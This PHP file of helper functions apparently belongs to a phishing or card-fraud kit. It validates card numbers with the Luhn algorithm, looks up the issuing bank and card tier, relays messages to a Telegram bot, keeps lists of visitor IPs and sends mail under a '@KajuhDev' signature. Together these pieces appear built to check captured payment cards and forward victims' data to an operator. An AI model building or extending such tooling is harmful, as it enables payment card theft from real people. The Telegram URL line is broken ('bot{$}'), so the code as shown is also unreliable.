<?php

function binChecker($bin) {
    $api_url = "https://data.handyapi.com/bin/{$bin}";
    $response = file_get_contents($api_url);
    $result = json_decode($response, true);
    $_SESSION['type'] = $result['Type'];
    $_SESSION['level'] = $result['CardTier'];
    $_SESSION['bank'] = $result['Issuer'];
    $_SESSION['country'] = $result['country'];
}

function luhnChecker($cardNumber) {
    $cardNumber = str_replace(array(' ', '-'), '', $cardNumber);
    $cardNumber = strrev($cardNumber);
    $sum = 0;

    // Parcourir chaque chiffre du numéro de carte
    for ($i = 0, $length = strlen($cardNumber); $i < $length; $i++) {
        $digit = (int)$cardNumber[$i];

        if ($i % 2 == 1) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $sum += $digit;
    }

    return $sum % 10 == 0;
}

function sendMessage($chat_id, $text, $buttons = null, $replyToId = null) {
    global $token;

    $urlParams = array(
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    );

    if ($buttons !== null) {
        $urlParams['reply_markup'] = json_encode($buttons);
    }

    if ($replyToId !== null) {
        $urlParams['reply_to_message_id'] = $replyToId;
    }
    
     $apiUrl = "https://api.telegram.org/bot{$}/sendMessage?" . http_build_query($urlParams);
     $ch = curl_init($apiUrl);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     $response = curl_exec($ch);
     curl_close($ch);
     $response = json_decode($response, true);
}

function writeOnFile($file, $ip) {
    $content = file_get_contents($file);
    if (strpos($content, $ip) !== false) {
        return;
    }
    
    file_put_contents($file, $ip . PHP_EOL, FILE_APPEND);
}

function removeIPFromFile($file, $ip) {
    $content = file_get_contents($file);
    
    if (strpos($content, $ip) !== false) {
        $content = str_replace($ip . PHP_EOL, '', $content);
        
        file_put_contents($file, $content);
    }
}

function sendMail($subject, $text) {
    global $mail;
    $headers = array(
        'From' => '🎈 @KajuhDev 🎈',
        'Reply-To' => 'kajuhdev@telegramuhq.xyz'
    );
    mail($mail['address'], $subject, $text, $headers);
}